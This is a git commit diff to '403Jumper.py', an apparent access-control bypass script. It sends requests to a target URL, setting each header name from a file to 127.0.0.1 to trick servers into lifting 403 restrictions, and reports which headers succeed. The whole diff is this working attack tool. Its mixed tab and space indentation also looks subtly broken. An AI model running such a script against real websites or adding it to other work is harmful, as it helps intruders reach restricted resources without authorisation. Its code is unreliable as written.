194f2ada19767350e27f4f6a7f6a89fbeeafb500
Saadet-T <68515706+Saadet-T@users.noreply.github.com>
2022-08-24 17:27:56 +0300

    Update 403Jumper.py

--- 403Jumper.py
+++ 403Jumper.py
@@ -3,16 +3,13 @@ import sys
 with open('headers.txt','r') as f: #the file contains the bypass headers
     headersx = [line.strip() for line in f]#we read the file than pass it to a list
 f.close()
-with open('targets.txt','r') as t: #the file contains the bypass headers
-    targetsx = [line.strip() for line in t]#we read the file than pass it to a list
-t.close()
-for target in targetsx:
-	failedbypass=0;#If all the headers fails then program will use this value to tell all of them failed
-	for header in headersx:	
-       		headers = {''+header :'127.0.0.1'}
-		req = requests.get(target, headers=headers)#request happens here 
-		if req.status_code == 200:
-   		 	print('This Payload is succesfull for'+target +'=> '+header+':127.0.0.1' )
-			failedbypass=failedbypass+1;#adds 1 to failedbypass value if any header is successfull   		
-	if(failedbypass==0):
-		print('None of them succeeded for ' +target)
+target=(sys.argv[1])#Passing parameter value into a variable
+failedbypass=0;#If all the headers fails then program will use this value to tell all of them failed
+for header in headersx:
+       	headers = {''+header :'127.0.0.1'}
+	req = requests.get(target, headers=headers)#request happens here 
+	if req.status_code == 200:
+   	 	print('This Payload is succesfull => '+header+':127.0.0.1' )
+		failedbypass=failedbypass+1;#adds 1 to failedbypass value if any header is successfull   		
+if(failedbypass==0):
+	print('None of them succeeded')
